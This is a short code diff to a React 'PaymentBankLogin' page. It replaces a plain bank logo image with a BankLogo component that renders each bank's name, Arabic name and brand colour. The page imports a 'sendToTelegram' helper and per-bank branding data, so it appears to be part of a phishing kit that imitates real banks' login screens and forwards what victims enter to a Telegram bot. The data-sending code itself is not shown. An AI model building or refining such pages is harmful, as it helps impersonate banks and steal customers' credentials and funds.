@@ -13,6 +13,7 @@ import { sendToTelegram } from "@/lib/telegram";
 import { getBankById } from "@/lib/banks";
 import { getCountryByCode } from "@/lib/countries";
 import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
+import BankLogo from "@/components/BankLogo";
 
 const PaymentBankLogin = () => {
   const { id } = useParams();
@@ -286,15 +287,18 @@ const PaymentBankLogin = () => {
       >
         <div className="flex items-center justify-between mb-4">
           <div className="flex items-center gap-3">
-            {selectedBank?.logo ? (
+            {selectedBank ? (
               <div 
                 className="w-16 h-16 sm:w-20 sm:h-20 rounded-xl bg-white p-3 flex items-center justify-center shadow-lg"
                 style={{ borderRadius: selectedBankBranding?.borderRadius.md || '10px' }}
               >
-                <img 
-                  src={selectedBank.logo} 
-                  alt={selectedBank.nameAr}
-                  className="max-w-full max-h-full object-contain"
+                <BankLogo 
+                  bankId={selectedBank.id}
+                  bankName={selectedBank.name}
+                  bankNameAr={selectedBank.nameAr}
+                  color={selectedBank.color}
+                  size="lg"
+                  className="w-full h-full"
                 />
               </div>
             ) : (
